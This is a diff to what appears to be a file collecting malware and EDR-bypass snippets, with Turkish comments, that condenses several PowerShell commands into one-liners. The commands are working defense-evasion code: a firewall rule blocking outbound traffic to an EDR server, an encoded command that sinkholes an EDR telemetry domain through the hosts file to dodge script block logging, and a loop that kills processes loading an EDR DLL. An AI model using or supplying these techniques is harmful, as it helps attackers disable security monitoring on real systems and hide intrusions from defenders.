@@ -412,12 +412,9 @@ Malware 7 (Process and Thread Injection in C)
 avbypass = r'''
 EDR bypass:
 🔥 Alternatif: PowerShell ile netsh Kullanarak IP Bazlı Egress Engelleme
+$ip = "198.51.100.45"; $rule = "block_edr"; Start-Process -FilePath "netsh" -ArgumentList "advfirewall firewall add rule name=$rule dir=out action=block remoteip=$ip" -Verb runAs
 
-$ip = "198.51.100.45" # EDR sunucu IP’si (örnek IP - değiştirmelisin)
-$rule = "block_edr"
-
-Start-Process -FilePath "netsh" -ArgumentList "advfirewall firewall add rule name=$rule dir=out action=block remoteip=$ip" -Verb runAs
-
+-------------------------------------
 🎭 Daha Gizli Versiyon (Script Block Logging vs Bypass için encoded payload):
 
 $cmd = 'Add-Content -Path "$env:SystemRoot\System32\drivers\etc\hosts" -Value "127.0.0.1`ttele.edr.cloud"'
@@ -428,20 +425,7 @@ powershell -EncodedCommand $enc
 🛡️ 3. EDR DLL Load'larını Etkin Süreçte İzleme ve Kapatma (Sysmon / Event 7 Gibi)
 
 EDR’ye ait DLL’lerin hangi süreçlere yüklendiğini görüp, PowerShell ile dinamik olarak bunları suspend veya unload etmeye çalışmak:
-
-$edrDll = "edrhook.dll"
-Get-Process | ForEach-Object {
-    try {
-        $modules = $_.Modules
-        foreach ($mod in $modules) {
-            if ($mod.ModuleName -like "*$edrDll*") {
-                Write-Host "[!] EDR DLL bulundu: $($mod.ModuleName) in process $($_.Name)"
-                Stop-Process -Id $_.Id -Force
-            }
-        }
-    } catch {}
-}
-
+$edrDll = "edrhook.dll"; Get-Process | ForEach-Object { try { $modules = $_.Modules; foreach ($mod in $modules) { if ($mod.ModuleName -like "*$edrDll*") { Write-Host "[!] EDR DLL bulundu: $($mod.ModuleName) in process $($_.Name)"; Stop-Process -Id $_.Id -Force } } } catch { Write-Host "[!] Hata: $($_.Exception.Message)" } }
 
 🧨 2. Advanced API-based Suspend (Low-Level Native)
 
